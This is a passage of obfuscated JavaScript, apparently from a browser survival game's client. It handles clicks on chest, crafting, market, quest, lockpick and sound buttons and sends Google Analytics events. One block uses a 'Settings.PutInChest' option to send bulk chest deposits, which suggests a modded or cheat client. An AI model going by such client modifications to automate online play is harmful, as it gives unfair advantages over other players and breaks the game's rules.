					var ᐃᐃΔⵠ = ᐃᐃᐃ.ⵠΔΔᐃΔⲆᐃ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
					if (ᐃᐃΔⵠ) ΔⵠⲆᐃ.ᐃΔᐃⲆⵠⵠᐃᐃⲆ(ΔΔΔⵠ)
				}
				var ⲆΔΔⲆ = ᐃᐃΔ.ⲆΔΔⲆ;
				if (ⲆΔΔⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && 0 < ⲆΔΔⲆ.ⵠⵠᐃΔⵠⲆΔ && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]) {
					switch (ⲆΔΔⲆ.type) {
						case ⲆⲆᐃ.ᐃⵠᐃⲆⵠ:
							var ᐃᐃΔⵠ = ᐃᐃᐃ.ΔⵠΔΔᐃᐃΔ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
							ᐃᐃΔⵠ && ΔⵠⲆᐃ.ⵠᐃᐃⲆⲆΔⲆ(ⲆΔΔⲆ);
							break;
						case ⲆⲆᐃ.ⲆΔΔΔᐃ:
							var ᐃᐃΔⵠ = ᐃᐃᐃ.ⲆΔⵠᐃⲆᐃⵠ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
							if (ᐃᐃΔⵠ) ΔⵠⲆᐃ.ⵠᐃᐃⲆⲆΔⲆ(ⲆΔΔⲆ);
							break;
						case ⲆⲆᐃ.ⵠⵠΔⵠⵠ:
							var ᐃᐃΔⵠ = ᐃᐃᐃ.ΔᐃⲆⵠⲆΔᐃ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
							if (ᐃᐃΔⵠ) ΔⵠⲆᐃ.ⵠᐃᐃⲆⲆΔⲆ(ⲆΔΔⲆ);
							break;
						case ⲆⲆᐃ.ᐃᐃΔⲆⲆ:
							var ᐃᐃΔⵠ = ᐃᐃᐃ.ᐃΔΔᐃⲆⵠⲆ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
							ᐃᐃΔⵠ && ΔⵠⲆᐃ.ⵠᐃᐃⲆⲆΔⲆ(ⲆΔΔⲆ);
							break;
						case ⲆⲆᐃ.ⵠᐃΔⲆᐃ:
							var ᐃᐃΔⵠ = ᐃᐃᐃ.ΔⲆⲆΔⵠⵠⲆ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
							ᐃᐃΔⵠ && ΔⵠⲆᐃ.ⵠᐃᐃⲆⲆΔⲆ(ⲆΔΔⲆ);
							break
					}
				}
				var ᐃΔᐃΔ = ᐃᐃΔ.ᐃΔᐃΔ;
				if (ᐃΔᐃΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && ᐃΔᐃΔ.ⲆⲆⲆⵠΔΔΔ > 0 && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]) {
					var ᐃᐃΔⵠ = ᐃᐃᐃ.ⵠΔᐃⵠⵠⲆⲆ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
					ᐃᐃΔⵠ && ΔⵠⲆᐃ.ⵠᐃΔᐃⲆΔΔⲆⵠ(ᐃΔᐃΔ)
				}
				if (ᐃᐃΔ.sign[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]) {
					var ᐃᐃΔⵠ = ᐃᐃᐃ.sign.button.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
					ᐃᐃΔⵠ && ᐃᐃᐃ.sign.select()
				}
				if (!ᐃᐃΔ.ⲆᐃⲆΔ.lock && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]) {
					if (ᐃᐃΔ.ⲆᐃⲆΔ.ⵠᐃⵠᐃⵠᐃⵠ) {
						ᐃᐃΔⵠ = ᐃᐃᐃ.ⵠᐃⵠΔᐃⵠⲆ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
						if (ᐃᐃΔⵠ) ΔⵠⲆᐃ.ⲆⵠΔΔⵠᐃΔᐃⵠ(ⲆᐃⲆΔ)
					}
				}
				if (ᐃᐃΔ.ⲆᐃⲆΔ.ΔᐃⲆⲆⵠⲆΔ && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]) {
					ᐃᐃΔⵠ = ᐃᐃᐃ.ⲆⲆⲆⵠᐃΔΔ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
					if (ᐃᐃΔⵠ) {
						ΔⵠⲆᐃ.ⲆⲆⵠΔᐃⵠⵠᐃⵠ(ⲆᐃⲆΔ);
						if (ga) ga(ⵠ[499], ⵠ[37], ⵠ[383], "lockpick")
					}
				}
				if (ᐃᐃΔ.ⵠᐃΔΔⲆ[ΔᐃⲆⵠⲆⵠΔ[72]]) {
					var ᐃᐃΔⵠ = ᐃᐃᐃ.ⵠᐃΔΔⲆ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
					if (ᐃᐃΔⵠ) {
						ΔⵠⲆᐃ.ⵠᐃΔΔⲆ();
						ga && ga(ⵠ[499], ⵠ[37], ⵠ[383], "resurrection")
					}
				}
				if (ᐃᐃΔ.ⵠΔΔⲆ.id < 0    && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]) {
					var Ⲇⵠⵠ = ᐃᐃΔ.ⲆⵠⲆⵠ.ⵠΔᐃⲆⵠ;
					for (var ⵠᐃ = ⵠⲆᐃⵠ; Ⲇⵠⵠ.length > ⵠᐃ; ⵠᐃ++) {
						var ᐃᐃΔⵠ = Ⲇⵠⵠ[ⵠᐃ].ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
						if (!ᐃᐃΔⵠ) {
							if (ⲆᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && (ⲆᐃⲆΔ.id < 0 || Ⲇⵠⵠ[ⵠᐃ].id === ⲆᐃⲆΔ.id)) {
								var ᐃᐃΔⵠ = ᐃᐃᐃ.ΔΔᐃⵠⲆ[Ⲇⵠⵠ[ⵠᐃ].id].ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
								if (ᐃᐃΔⵠ && ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ < 0) {
									if (ΔΔΔⲆ.shiftKey) {
										if (Settings.PutInChest > 255) {
											for (let i = 0; i < Settings.PutInChest / 255; i++) {
												if (i === Math.floor(Settings.PutInChest / 255)) {
													ΔⵠⲆᐃ.ⲆⲆΔΔΔⲆΔⲆᐃ(ⲆᐃⲆΔ, Ⲇⵠⵠ[ⵠᐃ].id, Settings.PutInChest % 255)
												} else {
													ΔⵠⲆᐃ.ⲆⲆΔΔΔⲆΔⲆᐃ(ⲆᐃⲆΔ, Ⲇⵠⵠ[ⵠᐃ].id, 255)
												}
											}
										} else {
											ΔⵠⲆᐃ.ⲆⲆΔΔΔⲆΔⲆᐃ(ⲆᐃⲆΔ, Ⲇⵠⵠ[ⵠᐃ].id, Settings.PutInChest)
										}
									} else {
										ΔⵠⲆᐃ.ⲆⲆΔΔΔⲆΔⲆᐃ(ⲆᐃⲆΔ, Ⲇⵠⵠ[ⵠᐃ].id, 1)
									}
								}
							} else if (Ⲇⵠⵠⵠⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && ᐃᐃ.ΔⵠⵠⵠΔ === Ⲇⵠⵠ[ⵠᐃ].id) {
								var ᐃᐃΔⵠ = ᐃᐃᐃ.ΔΔᐃⵠⲆ[Ⲇⵠⵠ[ⵠᐃ].id].ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
								if (ᐃᐃΔⵠ && ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ < 0) ΔⵠⲆᐃ.ⵠⵠΔΔᐃΔᐃΔⵠ(Ⲇⵠⵠⵠⵠ)
							} else if (ΔⲆᐃⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && ᐃᐃ.ⵠⲆⲆᐃ === Ⲇⵠⵠ[ⵠᐃ].id) {
								var ᐃᐃΔⵠ = ᐃᐃᐃ.ΔΔᐃⵠⲆ[Ⲇⵠⵠ[ⵠᐃ].id].ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
								if (ᐃᐃΔⵠ && ⵠⲆⲆ > ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ) ΔⵠⲆᐃ.ᐃΔᐃΔⵠⵠᐃⵠⲆ(ΔⲆᐃⲆⵠ, ΔΔΔⲆ.shiftKey ? 10 : ⵠΔⲆ)
							} else if (ΔΔΔⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && ᐃᐃ.ⵠⲆⲆⲆⵠ === Ⲇⵠⵠ[ⵠᐃ].id) {
								var ᐃᐃΔⵠ = ᐃᐃᐃ.ΔΔᐃⵠⲆ[Ⲇⵠⵠ[ⵠᐃ].id].ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
								if (ᐃᐃΔⵠ && 0 > ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ) ΔⵠⲆᐃ.ⲆⵠⵠΔⵠᐃΔⵠⵠ(ΔΔΔⵠ, ΔΔΔⲆ.shiftKey ? 10 : 1)
							} else if (ⲆΔΔⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && ᐃᐃ.ⵠⲆⲆᐃ === Ⲇⵠⵠ[ⵠᐃ].id) {
								var ᐃᐃΔⵠ = ᐃᐃᐃ.ΔΔᐃⵠⲆ[Ⲇⵠⵠ[ⵠᐃ].id].ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
								ᐃᐃΔⵠ && Ⲇᐃᐃᐃ > ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ && ΔⵠⲆᐃ.ᐃⲆᐃΔⵠᐃⵠⲆⵠ(ⲆΔΔⲆ, ΔΔΔⲆ.shiftKey ? ⲆⵠⲆᐃⲆ : 1)
							} else if (ᐃΔᐃΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && (Ⲇⵠⵠ[ⵠᐃ].id === ᐃᐃ.ⵠⲆⲆᐃ || ᐃᐃ.ⵠᐃⲆⵠᐃ === Ⲇⵠⵠ[ⵠᐃ].id)) {
								var ᐃᐃΔⵠ = ᐃᐃᐃ.ΔΔᐃⵠⲆ[Ⲇⵠⵠ[ⵠᐃ].id].ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
								if (ᐃᐃΔⵠ && ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ < ⵠᐃⲆᐃ) {
									Ⲇⵠⵠ[ⵠᐃ].id === ᐃᐃ.ⵠⲆⲆᐃ ? ΔⵠⲆᐃ.ⵠᐃⵠⲆⵠⲆᐃ(ᐃΔᐃΔ, ΔΔΔⲆ.shiftKey ? 10 : ⲆⵠⲆⲆ, ⵠΔⲆⵠ) : ΔⵠⲆᐃ.ⵠᐃⵠⲆⵠⲆᐃ(ᐃΔᐃΔ, ⲆⲆⲆᐃ, ΔΔΔⲆ.shiftKey ? ⲆⲆΔΔⲆⲆⵠ : 1)
								}
							}
							continue
						} else {
							if (ΔΔΔⲆ.which == ⵠᐃⵠΔ && !ΔΔΔⲆ.shiftKey) ΔⵠⲆᐃ.ᐃΔⲆⲆΔ(Ⲇⵠⵠ[ⵠᐃ].id, ⵠᐃ);
							else if ((1 == ΔΔΔⲆ.which && ΔΔΔⲆ.shiftKey || ΔΔΔⲆ.which == 3) && 0 > ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ) ᐃᐃᐃ.ⵠⵠᐃᐃ.ΔⵠⲆⲆⲆⲆᐃ(Ⲇⵠⵠ[ⵠᐃ].id)
						}
					}
				}
				if (ᐃᐃΔ.ⵠΔΔⲆ.id < Ⲇᐃᐃᐃ && ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ < 0    && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃΔ.ⵠⵠⲆⵠⵠ) {
					var Ⲇⵠⵠ = ᐃᐃΔ.ⵠΔΔⲆ.ⵠⵠᐃΔᐃ;
					for (var ⵠᐃ = 0; Ⲇⵠⵠ.length > ⵠᐃ; ⵠᐃ++) {
						var ᐃᐃΔⵠ = Ⲇⵠⵠ[ⵠᐃ].ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
						if (!ᐃᐃΔⵠ) continue;
						ΔΔᐃΔⵠ = ΔⵠⲆᐃ.ⲆᐃⲆᐃᐃΔⲆⲆᐃ(Ⲇⵠⵠ[ⵠᐃ].id);
						if (ΔΔᐃΔⵠ && ga) ga(ⵠ[499], ⵠ[37], ⵠ[383], "craft", ⲆⲆⵠᐃ[ⵠⲆⵠᐃΔ[Ⲇⵠⵠ[ⵠᐃ].id].ⵠΔᐃⲆ].name)
					}
				}
				if (ᐃⵠⲆ > ᐃᐃΔ.ⵠΔΔⲆ.id && ΔΔⵠ > ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ && ᐃᐃΔ.ΔᐃᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⲆⵠⵠⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ΔΔΔΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.options[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠΔⵠⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]]) {
					var ᐃᐃΔⵠ = ᐃᐃᐃ.ΔᐃᐃⲆΔ.button.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ);
					ᐃᐃΔⵠ && ΔⵠⵠⲆ.ΔᐃᐃⲆΔ.select()
				}
				if (ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ < ⵠᐃⲆᐃ && !ᐃᐃᐃ.ΔΔΔΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⲆⵠⵠⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠΔⵠⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.options[ΔᐃⲆⵠⲆⵠΔ[72]]) {
					if (ⲆⲆⵠⲆ.ⲆΔΔᐃⵠ) {
						var ᐃᐃΔⵠ = ᐃᐃᐃ.ⲆⲆⵠⲆ.ⲆΔΔⲆⵠᐃⲆ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
						if (ᐃᐃΔⵠ) {
							ⲆⲆⵠⲆ.select();
							if (ga) ga(ⵠ[499], ⵠ[37], ⵠ[383], "sound on")
						}
					} else {
						var ᐃᐃΔⵠ = ᐃᐃᐃ.ⲆⲆⵠⲆ.ΔᐃᐃⲆᐃᐃᐃ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
						if (ᐃᐃΔⵠ) {
							ⲆⲆⵠⲆ.select();
							if (ga) ga(ⵠ[499], ⵠ[37], ⵠ[383], "sound off")
						}
					}
				}
				if (ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ < ᐃⵠⲆⵠ && !ᐃᐃᐃ.ΔΔΔΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠΔⵠⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⲆⵠⵠⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]) {
					var ᐃᐃΔⵠ = ᐃᐃᐃ.options.button.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
					if (ᐃᐃΔⵠ) {
						ᐃᐃᐃ.options.ⲆΔⵠΔᐃᐃⲆⵠΔ();
						ga && ga(ⵠ[499], ⵠ[37], ⵠ[383], "options")
					}
				}
				if (0 > ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ && !ᐃᐃᐃ.ΔΔΔΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠΔⵠⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.options[ΔᐃⲆⵠⲆⵠΔ[72]] && ᐃᐃᐃ.ⲆⲆⲆΔⲆᐃⲆ === 1) {
					var ᐃᐃΔⵠ = ᐃᐃᐃ.ⲆⵠⵠⲆᐃ.button.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
					if (ᐃᐃΔⵠ) {
						ᐃᐃᐃ.ⲆⵠⵠⲆᐃ.select();
						if (ga) ga(ⵠ[499], ⵠ[37], ⵠ[383], "market")
					}
				}
				if (ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ < Δⵠᐃ && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⲆⵠⵠⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.options[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠΔⵠⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && ᐃᐃᐃ.ⵠᐃΔᐃⵠⵠⵠ === 1) {
					var ᐃᐃΔⵠ = ᐃᐃᐃ.ΔΔΔΔ.button.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
					if (ᐃᐃΔⵠ) {
						ᐃᐃᐃ.ΔΔΔΔ.ΔⵠⲆⲆᐃᐃⲆⵠⵠ();
						ga && ga(ⵠ[499], ⵠ[37], ⵠ[383], "recipe")
					}
				}
				if (ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ < 0 && !ᐃᐃᐃ.ΔΔΔΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.options[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠΔⵠⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⲆⵠⵠⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && ΔᐃᐃΔ.ⵠᐃᐃⲆᐃ !== ⲆⲆⲆ.mode && ΔᐃᐃΔ.ⲆⲆⵠⵠⲆ !== ⲆⲆⲆ.mode && ΔᐃᐃΔ.ⲆⵠⲆⵠᐃⲆΔ !== ⲆⲆⲆ.mode && ᐃᐃᐃ.ᐃΔΔΔⵠᐃⲆ === 1) {
					var ᐃᐃΔⵠ = ᐃᐃᐃ.ᐃⲆᐃⲆ.button.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
					if (ᐃᐃΔⵠ) {
						ᐃᐃᐃ.ᐃⲆᐃⲆ.select();
						if (ga) ga(ⵠ[499], ⵠ[37], ⵠ[383], "quests")
					}
				}
				ᐃᐃΔ.ⵠΔΔⲆ.ⲆΔΔⲆⲆ && ΔΔΔⲆ.which == ᐃᐃⲆⲆ && ᐃᐃᐃ.ⵠΔⵠⲆⵠ.ΔⵠⲆⲆⲆⲆᐃ()
			};
			this.ΔᐃⵠⵠᐃⲆᐃ = ⲆᐃⵠⲆⵠ;
			this.ⲆⲆⵠᐃᐃⵠΔ = function(ΔΔΔⲆ) {
				ⲆⲆⵠⵠ.ⵠΔΔᐃ = ᐃⵠΔⵠᐃΔⲆ(ᐃᐃᐃ.Ⲇⵠ, ΔΔΔⲆ);
				var ΔⲆΔᐃⵠ = ΔⵠΔⲆΔ;
				ΔⵠⵠⲆ.Δᐃᐃᐃᐃ.display = ᐃΔΔ;
				ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃΔⵠΔᐃᐃΔ.ΔⲆⵠⲆΔ(ⲆⲆⵠⵠ.ⵠΔΔᐃ);
				if (ᐃᐃᐃ.ΔΔⲆᐃⲆ != -1) ΔⲆΔᐃⵠ |= ᐃᐃᐃ.ᐃΔⵠΔᐃ[ᐃᐃᐃ.ΔΔⲆᐃⲆ].button.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ);
				var ΔΔΔⵠ = ᐃᐃΔ.ΔΔΔⵠ;
				if (ΔΔΔⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && ΔᐃΔΔ < ΔΔΔⵠ.ΔΔΔⲆᐃ) ΔⲆΔᐃⵠ |= ᐃᐃᐃ.ⵠΔΔᐃΔⲆᐃ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ);
				var ⲆΔΔⲆ = ᐃᐃΔ.ⲆΔΔⲆ;
				ⲆΔΔⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && ⲆΔⵠ < ⲆΔΔⲆ.ⵠⵠᐃΔⵠⲆΔ && (ΔⲆΔᐃⵠ |= ᐃᐃᐃ.ΔⵠΔΔᐃᐃΔ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ), ΔⲆΔᐃⵠ |= ᐃᐃᐃ.ⲆΔⵠᐃⲆᐃⵠ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ), ΔⲆΔᐃⵠ |= ᐃᐃᐃ.ΔᐃⲆⵠⲆΔᐃ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ), ΔⲆΔᐃⵠ |= ᐃᐃᐃ.ᐃΔΔᐃⲆⵠⲆ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ), ΔⲆΔᐃⵠ |= ᐃᐃᐃ.ΔⲆⲆΔⵠⵠⲆ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ));
				var ᐃΔᐃΔ = ᐃᐃΔ.ᐃΔᐃΔ;
				ᐃΔᐃΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && ᐃΔᐃΔ.ⲆⲆⲆⵠΔΔΔ > ΔⲆⵠⲆ && (ΔⲆΔᐃⵠ |= ᐃᐃᐃ.ⵠΔᐃⵠⵠⲆⲆ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ));
				if (ᐃᐃΔ.sign[ΔᐃⲆⵠⲆⵠΔ[72]]) ΔⲆΔᐃⵠ |= ᐃᐃᐃ.sign.button.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ);
				var ⲆᐃⲆΔ = ᐃᐃΔ.ⲆᐃⲆΔ;
				if (ᐃᐃΔ.ⵠΔΔⲆ.id < 0 && ⲆᐃⲆΔ.id >= 0   ) {
					if (!ᐃᐃΔ.ⲆᐃⲆΔ.lock || ᐃᐃΔ.ⲆᐃⲆΔ.ⲆⵠⵠΔ === ᐃᐃΔ.id) ΔⲆΔᐃⵠ |= ᐃᐃᐃ.ⵠⵠΔ[ⲆᐃⲆΔ.id].ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ)
				}
				ᐃᐃΔ.ⵠᐃΔΔⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && (ΔⲆΔᐃⵠ |= ᐃᐃᐃ.ⵠᐃΔΔⲆ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ));
				if (!ᐃᐃΔ.ⲆᐃⲆΔ.lock   ) {
					if (ᐃᐃΔ.ⲆᐃⲆΔ.ⵠᐃⵠᐃⵠᐃⵠ) ΔⲆΔᐃⵠ |= ᐃᐃᐃ.ⵠᐃⵠΔᐃⵠⲆ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ)
				}
				ᐃᐃΔ.ⲆᐃⲆΔ.ΔᐃⲆⲆⵠⲆΔ    && (ΔⲆΔᐃⵠ |= ᐃᐃᐃ.ⲆⲆⲆⵠᐃΔΔ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ));
				if (ᐃᐃΔ.ⵠΔΔⲆ.id < 0   ) {
					var Ⲇⵠⵠ = ᐃᐃΔ.ⲆⵠⲆⵠ.ⵠΔᐃⲆⵠ;
					for (var ⵠᐃ = ΔΔⵠⵠ; Ⲇⵠⵠ.length > ⵠᐃ; ⵠᐃ++) {
						var ⲆΔᐃⵠⲆΔᐃ = Ⲇⵠⵠ[ⵠᐃ].ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ);
						ΔⲆΔᐃⵠ |= ΔⵠⵠⲆ.Δᐃᐃᐃᐃ.ⵠΔⵠⲆ(ⲆΔᐃⵠⲆΔᐃ, Ⲇⵠⵠ[ⵠᐃ], ᐃⵠⲆ);
